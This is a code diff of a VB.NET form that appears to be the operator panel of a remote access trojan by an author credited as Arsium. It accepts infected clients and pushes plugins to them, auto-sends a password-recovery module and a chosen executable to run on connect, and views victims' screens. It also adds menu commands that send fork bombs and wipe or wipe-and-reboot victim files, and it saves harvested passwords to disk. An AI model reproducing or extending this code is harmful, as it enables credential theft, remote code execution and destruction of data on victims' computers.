@@ -7,6 +7,7 @@ Imports System.Runtime.InteropServices
 Imports System.Runtime.Serialization.Formatters.Binary
 Imports System.Text
 Imports System.Threading
+Imports Microsoft.VisualBasic.Devices
 ''||       AUTHOR Arsium       ||
 ''||       github : https://github.com/arsium       ||
 Public Class Form1
@@ -38,7 +39,7 @@ Public Class Form1
     End Sub
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-
+        '    Log_Form.Show()
         Timer2.Start()
         MKWFGA.Animations.Animation(Me.Handle, 1000, MKWFGA.Animations.AnimtedFlags.Blend)
 
@@ -60,7 +61,7 @@ Public Class Form1
 
 
 
-#Region "Viewer"
+#Region "Viewer OLD"
 
 
     Public RDPViewer As TcpListener
@@ -125,15 +126,18 @@ Public Class Form1
             Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
             Task.Factory.StartNew(Sub() AcceptAndRead(Context), CancellationToken.None, TaskCreationOptions.LongRunning)
 
+            '   o.Start()
 
-            RDPViewer = New TcpListener(IPAddress.Any, NumericUpDown2.Value)
+            '  RDPViewer = New TcpListener(IPAddress.Any, NumericUpDown2.Value)
 
-            RDPViewer.Start()
+            ' RDPViewer.Start()
 
 
 
-            Task.Run(Sub() GetRDVClient())
-            Timer1.Start()
+            '  Task.Run(Sub() GetRDVClient())
+
+
+            '  Timer1.Start()
 
             UcBtnExt1.BtnText = "Started !"
 
@@ -151,10 +155,10 @@ Public Class Form1
             CliSt.Clear()
             serve.Stop()
 
-            Timer1.Stop()
+
             AeroListView1.Items.Clear()
             CliSt.Clear()
-            RDPViewer.Stop()
+            '    RDPViewer.Stop()
             UcBtnExt1.BtnText = "Listen !"
 
 
@@ -162,7 +166,31 @@ Public Class Form1
 
     End Sub
 
-    Public Sub AcceptAndRead(ByVal Context As TaskScheduler)
+
+
+    Public Sub AUTOPLG(ByVal TcpCli As TcpClient)
+        Thread.Sleep(1500)
+
+        If Auto_RECOV.Checked = True Then
+            Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|ENDING|"
+            Dim B As Byte() = Encoding.Default.GetBytes(o)
+            Task.Run(Sub() TcpCli.GetStream.WriteAsync(B, 0, B.Length))
+
+        End If
+        Thread.Sleep(1000)
+
+
+        If AUTO_CHK_FILE.Checked Then
+
+            Dim o As String = PL_IJCT & "|SP1|" & "" & "|SP2|" & "|EXE|" & "|SP2|" & FILETOEXEC & "|ENDING|"
+            Dim B As Byte() = Encoding.Default.GetBytes(o)
+            Task.Run(Sub() TcpCli.GetStream.WriteAsync(B, 0, B.Length))
+        End If
+
+
+
+    End Sub
+    Public Async Sub AcceptAndRead(ByVal Context As TaskScheduler)
 
         Try
             While (True)
@@ -181,14 +209,51 @@ Public Class Form1
 
                 Task.Run(Sub() SenderHelper.SenderHelper(CliSt, TcpCLI.Client.RemoteEndPoint.ToString, "|GETID|"))
 
+                Dim DATA As New StringBuilder
 
 
-                Dim jaz As New StringBuilder
+                Task.Run(Sub() CheckClient(TcpCLI))
 
 
 
-                Dim ah As New Thread(Sub() RD(TcpCLI, Context, TcpCLI.Client.RemoteEndPoint.ToString, jaz))
-                ah.Start()
+                Task.Run(Sub() RD(TcpCLI, Context, TcpCLI.Client.RemoteEndPoint.ToString, DATA))
+
+
+
+
+                Dim h As New Thread(Sub() AUTOPLG(TcpCLI))
+
+                h.Start()
+
+
+
+                '  If Auto_RECOV.Checked = True Then
+
+                '   Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|ENDING|"
+
+                '    Dim B As Byte() = Encoding.Default.GetBytes(o)
+                '  Dim oa As New Thread(Sub() LaunchAtConnect(TcpCLI.GetStream, B))
+                '  RaiseEvent AUTO_PL(TcpCLI)
+                '   oa.Start()
+                '  Task.Run(Sub() TcpCLI.GetStream.WriteAsync(B, 0, B.Length))
+
+                '   End If
+
+
+
+
+
+
+
+
+
+
+
+
+                ' Dim ReadData As New Thread(Sub() RD(TcpCLI, Context, TcpCLI.Client.RemoteEndPoint.ToString, DATA))
+                ' ReadData.Start()
+
+
 
             End While
         Catch ex As Exception
@@ -197,12 +262,35 @@ Public Class Form1
     End Sub
 
 
+#Region "Client Checker"
+    Public Shared TestBytes As Byte() = Encoding.Default.GetBytes("")
+    Public Async Sub CheckClient(ByVal k As TcpClient)
+        While True
+            Try
+                Await k.GetStream.WriteAsync(TestBytes, 0, TestBytes.Length)
+            Catch ex As Exception
+                For Each az As ListViewItem In AeroListView1.Items
+                    If az.Text = k.Client.RemoteEndPoint.ToString Then
+                        AeroListView1.Items.Remove(az)
+                        CliSt.Remove(k)
+                        Exit Sub
+                    End If
+                Next
+
+            End Try
+
+            Thread.Sleep(1000)
+        End While
+    End Sub
+#End Region
     Private Async Sub RD(ByVal stream As TcpClient, ByVal context As TaskScheduler, ByVal id As String, ByVal l As StringBuilder)
         ''
 
-
+        Dim foorm As New RViewerForm
+        Dim VT As New Thread(Sub() Application.Run(foorm))
         Dim FM1 As New FileManager_Form
         Dim TASK1 As New Tasks_Form
+
         Dim INFO1 As New Info_Form
         Dim StringHelper As New StringBuilder
         While True
@@ -210,14 +298,13 @@ Public Class Form1
 
 
 
-                Dim Buffer(150 * 4096) As Byte
-
+                '  Dim Buffer(500 * 4096) As Byte
+                Dim Buffer(5000 * 4096) As Byte
                 Dim lu As Integer = stream.GetStream.Read(Buffer, 0, Buffer.Length)
 
                 If lu > 0 Then
                     Try
-                        Dim Message As String = Encoding.UTF8.GetString(Buffer, 0, lu)
-                        l.Append(Message)
+                        Dim Message As String = Encoding.Default.GetString(Buffer, 0, lu)
 
 
 
@@ -225,27 +312,40 @@ Public Class Form1
 
 
 
-                        If l.ToString.EndsWith("|IDDEND|") Then
+
+                        If Message.EndsWith("|IDDEND|") Then
 
 
                             Try
-                                Dim n As String = l.ToString.Replace("|IDDEND|", "")
 
-                                Dim rhejk As String() = Split(n, "|IDD|")
+                                ' Dim n As String = Message.Replace("|IDDEND|", "")
+
+
+
+                                Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+
+
+
+                                Dim rhejk As String() = Split(j.Replace("|IDDEND|", ""), "|IDD|")
                                 Countries.GetFlags(id, ImageList1, AeroListView1, rhejk)
 
-                                l.Clear()
+                                'l.Clear()
                             Catch ex As Exception
 
                             End Try
-                            l.Clear()
+                            '  l.Clear()
 
 
 
-                        ElseIf l.ToString.EndsWith("|GotThatNice|") Then
+
+
+                        ElseIf Message.EndsWith("|GotThatNice|") Then
 
                             Dim a As New PassRecov_Form
-                            Dim k As String() = Split(l.ToString, "|GotThatNice|")
+
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+
+                            Dim k As String() = Split(j, "|GotThatNice|")
 
                             l.Clear()
 
@@ -266,18 +366,20 @@ Public Class Form1
 
 
 
-                        ElseIf l.ToString.EndsWith("|VOL|") Then
+                        ElseIf Message.EndsWith("|VOL|") Then
 
 
                             FM1 = New FileManager_Form
 
 
-                            Dim p As String = l.ToString.Replace("|VOL|", "")
+                            '  Dim p As String = Message.Replace("|VOL|", "")
 
+
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                             l.Clear()
 
 
-                            Dim o As String() = Split(p, Environment.NewLine)
+                            Dim o As String() = Split(j.Replace("|VOL|", ""), Environment.NewLine)
 
                             For i = 0 To o.Length - 2
 
@@ -290,28 +392,30 @@ Public Class Form1
 
 
                             AddHandler FM1.ComboBox1.SelectedIndexChanged, Sub() ComBoBoxHandler(FM1.ComboBox1, FM1)
-                            Dim j As New Thread(Sub() Application.Run(FM1))
-                            j.Start()
+                            Dim aj As New Thread(Sub() Application.Run(FM1))
+                            aj.Start()
 
 
 
 
 
 
-                        ElseIf l.ToString.Contains("/\ENDFM/\") Then
+                        ElseIf Message.Contains("/\ENDFM/\") Then
 
 
 
-                            Dim az As String() = Split(l.ToString, "|FILES|")
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+                            Dim az As String() = Split(j, "|FILES|")
                             l.Clear()
                             '  IO.File.WriteAllText("Test.txt", az(1))
 
                             Task.Run(Sub() SetFM(az, FM1))
 
 
-                        ElseIf l.ToString.EndsWith("|ENDW|") Then
+                        ElseIf Message.EndsWith("|ENDW|") Then
                             ''||       TEST ZONE       ||
-                            Dim h As String = l.ToString.Replace("|ENDW|", "")
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+                            Dim h As String = j.Replace("|ENDW|", "")
 
                             l.Clear()
 
@@ -320,45 +424,54 @@ Public Class Form1
                             aze.Start()
 
 
-                        ElseIf l.ToString.EndsWith("|DELTRUE|") Then
+                        ElseIf Message.EndsWith("|DELTRUE|") Then
 
-                            Dim b As String = l.ToString.Replace("|DELTRUE|", "")
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+
+                            Dim b As String = j.Replace("|DELTRUE|", "")
 
                             l.Clear()
                             Task.Run(Sub() DeleteFile(b, FM1))
 
-                        ElseIf l.ToString.EndsWith("|DELFALSE|") Then
+                        ElseIf Message.EndsWith("|DELFALSE|") Then
 
-                            Dim b As String = l.ToString.Replace("|DELFALSE|", "")
+
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+                            Dim b As String = j.Replace("|DELFALSE|", "")
 
 
                             l.Clear()
 
                             Task.Run(Sub() DeleteFileFailed(b, FM1))
 
-                        ElseIf l.ToString.EndsWith("|OPENTRUE|") Then
+                        ElseIf Message.EndsWith("|OPENTRUE|") Then
 
-                            Dim h As String = l.ToString.Replace("|OPENTRUE|", "")
+
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+
+                            Dim h As String = j.Replace("|OPENTRUE|", "")
 
 
                             l.Clear()
 
                             Task.Run(Sub() OpenFile(h))
 
-                        ElseIf l.ToString.EndsWith("|OPENFALSE|") Then
+                        ElseIf Message.EndsWith("|OPENFALSE|") Then
 
 
-                            Dim h As String = l.ToString.Replace("|OPENFALSE|", "")
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+
+                            Dim h As String = j.Replace("|OPENFALSE|", "")
                             l.Clear()
 
                             Task.Run(Sub() OpenFileFailed(h))
 
 
-                        ElseIf l.ToString.EndsWith("|TASKF|") Then
+                        ElseIf Message.EndsWith("|TASKF|") Then
 
-
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                             TASK1 = New Tasks_Form
-                            Dim h As String = l.ToString.Replace("|TASKF|", "")
+                            Dim h As String = j.Replace("|TASKF|", "")
 
                             l.Clear()
 
@@ -373,9 +486,9 @@ Public Class Form1
 
 
 
-                        ElseIf l.ToString.EndsWith("|TASKF||OLD|") Then
-
-                            Dim h As String = l.ToString.Replace("|TASKF||OLD|", "")
+                        ElseIf Message.EndsWith("|TASKF||OLD|") Then
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+                            Dim h As String = j.Replace("|TASKF||OLD|", "")
 
                             l.Clear()
 
@@ -392,9 +505,12 @@ Public Class Form1
                             'RK
 
 
-                        ElseIf l.ToString.EndsWith("|RK|") Then
+                        ElseIf Message.EndsWith("|RK|") Then
 
-                            Dim h As String = l.ToString.Replace("|RK|", "")
+
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+
+                            Dim h As String = j.Replace("|RK|", "")
 
                             l.Clear()
 
@@ -415,12 +531,13 @@ Public Class Form1
 
 
 
-                        ElseIf l.ToString.EndsWith("|INFOSYST|") Then
+                        ElseIf Message.EndsWith("|INFOSYST|") Then
 
-                            Dim o As String = l.ToString.Replace("|INFOSYST|", "")
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+                            Dim o As String = j.Replace("|INFOSYST|", "")
 
 
-                            l.Clear()
+                            ' l.Clear()
                             INFO1 = New Info_Form
 
                             INFO1.Label4.Text = id
@@ -428,19 +545,72 @@ Public Class Form1
                             Task.Run(Sub() SetInformation(INFO1, o))
 
 
+
+                        ElseIf Message.StartsWith("|DESK|") Then
+
+
+
+
+                            If VT.ThreadState = ThreadState.Running Then
+
+                                Try
+                                    Dim o As String() = Split(Message, "|SP|")
+                                    ' Dim MM = New IO.MemoryStream(Encoding.Default.GetBytes(o(1)))
+
+
+
+                                    ' Dim iii As Image = bf.Deserialize(MM)
+
+                                    Task.Run(Sub() SetImage(foorm.PictureBox1, o(1)))
+                                    'foorm.PictureBox1.Image = Image.FromStream(MM)
+                                    'iii
+                                    'Image.FromStream(MM)
+
+                                    'MM.Dispose()
+                                    GC.Collect()
+                                    GC.WaitForPendingFinalizers()
+                                Catch ex As Exception
+                                    VT.Abort()
+
+                                End Try
+
+                            Else
+                                foorm.Label4.Text = AeroListView1.SelectedItems(0).Text
+                                foorm.Text = AeroListView1.SelectedItems(0).Text
+                                VT.Start()
+                            End If
+
+                            '  GC.Collect()
+                            '    GC.WaitForPendingFinalizers()
+
+
+
+                        ElseIf message.EndsWith("|STPDSK|") Then
+                            foorm = New RViewerForm
+
+                            VT = New Thread(Sub() Application.Run(foorm))
+
+                        ElseIf Message.EndsWith("|ENDPROCINFO|") Then
+
+                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
+
+                            Dim Data As String = j.Replace("|ENDPROCINFO|", "")
+
+
+                            ' l.Clear()
+
+                            Task.Run(Sub() SetPROCINFO(Data))
+
                         End If
 
 
 
-
-
-
-
-
-
-                    Catch ex As Exception
-
+                    Catch ss As Exception
                     End Try
+
+
+
+
 
                 End If
 
@@ -460,36 +630,46 @@ Public Class Form1
 
 
     End Sub
-
-#Region "Client Checker"
-    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
-        Dim uiok As Byte() = Encoding.Default.GetBytes("")
-        Dim klm As New TcpClient
+    Public Async Sub SetImage(ByVal P As PictureBox, ByVal l As String)
+        Dim pazeza As Byte() = Await Task.Run(Function() Encoding.Default.GetBytes(l))
+        Dim MM = New IO.MemoryStream(pazeza)
 
 
 
-        Try
-
-            For Each iaze As TcpClient In CliSt
-
-                klm = iaze
-                iaze.GetStream.Write(uiok, 0, uiok.Length)
-
-            Next
-
-        Catch ex As Exception
-            For Each az As ListViewItem In AeroListView1.Items
-                If az.Text = klm.Client.RemoteEndPoint.ToString Then
-                    AeroListView1.Items.Remove(az)
-                    CliSt.Remove(klm)
-
-                End If
-            Next
-        End Try
+        ' Dim iii As Image = bf.Deserialize(MM)
 
 
+        P.Image = Image.FromStream(MM)
     End Sub
-#End Region
+    ''|| OLD CLIENT CHECKER ||
+
+    ' Private Sub Timer1_Tick(sender As Object, e As EventArgs)
+    'Dim uiok As Byte() = Encoding.Default.GetBytes("")
+    'Dim klm As New TcpClient
+
+
+
+    '  Try
+
+    'For Each iaze As TcpClient In CliSt
+
+    '           klm = iaze
+    '          iaze.GetStream.Write(uiok, 0, uiok.Length)
+
+    '  Next
+
+    'Catch ex As Exception
+    'For Each az As ListViewItem In AeroListView1.Items
+    'If az.Text = klm.Client.RemoteEndPoint.ToString Then
+    '                 AeroListView1.Items.Remove(az)
+    '               CliSt.Remove(klm)
+
+    '  End If
+    'Next
+    ' End Try
+
+
+    '  End Sub
 
 #Region "Tasks Manager Helper"
     Public Sub SetTask(ByVal az As String(), ByVal TASK1 As Tasks_Form)
@@ -570,6 +750,41 @@ Public Class Form1
             End Try
 
         End If
+    End Sub
+
+
+    Public Async Sub SetPROCINFO(ByVal yuiuyj As String)
+        Dim PF As New ProcInfo_Form
+
+
+        Dim nhgopl As String() = Split(yuiuyj, "|/\|")
+
+        PF.RichTextBox1.Text = nhgopl(0)
+
+
+
+        PF.RichTextBox2.Text = nhgopl(1)
+
+
+
+        PF.RichTextBox3.Text = nhgopl(2)
+
+
+        PF.RichTextBox4.Text = nhgopl(3)
+
+        PF.RichTextBox5.Text = nhgopl(4)
+
+
+        PF.RichTextBox6.Text = nhgopl(5)
+
+
+        PF.RichTextBox7.Text = nhgopl(6)
+
+
+        PF.Label1.Text = nhgopl(7)
+
+        Application.Run(PF)
+
     End Sub
 #End Region
 
@@ -767,14 +982,14 @@ Public Class Form1
         a.Label1.Text = "Passwords from : " & ID
 
         If XuiCheckBox1.Checked Then
-
+            Static J As New Random
             If IO.Directory.Exists(Application.StartupPath & "\Passwords") Then
                 IO.Directory.CreateDirectory(Application.StartupPath & "\Passwords")
-                IO.File.WriteAllText(Application.StartupPath & "\Passwords\Passwords_" & k(1).Replace(":", "_") & "_" & Date.Now.ToString.Replace(":", "_") & ".Pass", "Passwords From : " & ID & vbNewLine & vbNewLine & k(0) & vbNewLine)
+                IO.File.WriteAllText(Application.StartupPath & "\Passwords\Passwords_" & k(1).Replace(":", "_") & "_" & Date.Now.ToString.Replace(":", "_") & J.Next(0, 99) & ".txt", "Passwords From : " & ID & vbNewLine & vbNewLine & k(0) & vbNewLine)
 
             Else
                 IO.Directory.CreateDirectory(Application.StartupPath & "\Passwords")
-                IO.File.WriteAllText(Application.StartupPath & "\Passwords\Passwords_" & k(1).Replace(":", "_") & "_" & Date.Now.ToString.Replace(":", "_") & ".Pass", "Passwords From : " & ID & vbNewLine & vbNewLine & k(0) & vbNewLine)
+                IO.File.WriteAllText(Application.StartupPath & "\Passwords\Passwords_" & k(1).Replace(":", "_") & "_" & Date.Now.ToString.Replace(":", "_") & J.Next(0, 99) & ".txt", "Passwords From : " & ID & vbNewLine & vbNewLine & k(0) & vbNewLine)
             End If
         End If
         Application.Run(a)
@@ -782,6 +997,9 @@ Public Class Form1
 #End Region
 
 
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+        Label2.Text = DateTime.Now.TimeOfDay.Hours & ":" & DateTime.Now.TimeOfDay.Minutes & ":" & DateTime.Now.TimeOfDay.Seconds
+    End Sub
 
 
 
@@ -802,10 +1020,11 @@ Public Class Form1
        "\PLUGINS\FM.dll",
        "\PLUGINS\DDOS.dll",
        "\PLUGINS\TASKS.dll",
-        "\PLUGINS\HWDR.dll",
-         "\PLUGINS\DSK.dll",
-         "\PLUGINS\MSCT.dll",
-             "\PLUGINS\VRSA.dll"
+       "\PLUGINS\HWDR.dll",
+       "\PLUGINS\DSK.dll",
+       "\PLUGINS\MSCT.dll",
+       "\PLUGINS\VRSA.dll",
+       "\PLUGINS\IJCT.dll"
     }
 
 
@@ -818,6 +1037,7 @@ Public Class Form1
     Public PL_DSK As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(6)))
     Public PL_MSCT As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(7)))
     Public PL_VRSA As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(8)))
+    Public PL_IJCT As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(9)))
     '
 #End Region
 
@@ -983,7 +1203,7 @@ Public Class Form1
 
 
 
-            Dim o As String = "1800" & "|SRDV|"
+            Dim o As String = "|SRDV|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
@@ -1000,7 +1220,7 @@ Public Class Form1
 
 
 
-            Dim o As String = "1800" & "|TRDV|"
+            Dim o As String = "|TRDV|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
@@ -1341,8 +1561,78 @@ Public Class Form1
         End If
     End Sub
 
-    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
-        Label2.Text = DateTime.Now.TimeOfDay.Hours & ":" & DateTime.Now.TimeOfDay.Minutes & ":" & DateTime.Now.TimeOfDay.Seconds
+
+    Private Async Sub ForkBombToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ForkBombToolStripMenuItem.Click
+        '"|FBOMB|"
+
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+            Dim h As String = InputBox("Set a number : ")
+
+            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|FBOMB|" & "|SP2|" & h & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub DeleteFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFilesToolStripMenuItem.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+
+            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|DFOD|" & "|SP2|" & 0 & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub DeleteFilesRebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFilesRebootToolStripMenuItem.Click
+        '"|DFOD|" 
+
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|DFOD|" & "|SP2|" & 1 & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub InjectionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InjectionToolStripMenuItem.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+            Using l As New OpenFileDialog
+                If l.ShowDialog = DialogResult.OK Then
+
+
+                    Dim o As New Injector_Form
+
+                    o.Label4.Text = AeroListView1.SelectedItems(0).Text
+
+                    o.RichTextBox1.AppendText(Await Helper.ConvertTB64ASYNC(l.FileName))
+                    Dim j As New Thread(Sub() Application.Run(o))
+
+
+                    j.Start()
+
+                End If
+            End Using
+        End If
+    End Sub
+    Private Shared FILETOEXEC As String
+    Private Async Sub AUTO_CHK_FILE_Click(sender As Object, e As EventArgs) Handles AUTO_CHK_FILE.Click
+        Using h As New OpenFileDialog
+
+            If h.ShowDialog = DialogResult.OK Then
+                FILETOEXEC = Await Helper.ConvertTB64ASYNC(h.FileName)
+
+            End If
+        End Using
+
+
     End Sub
 
 
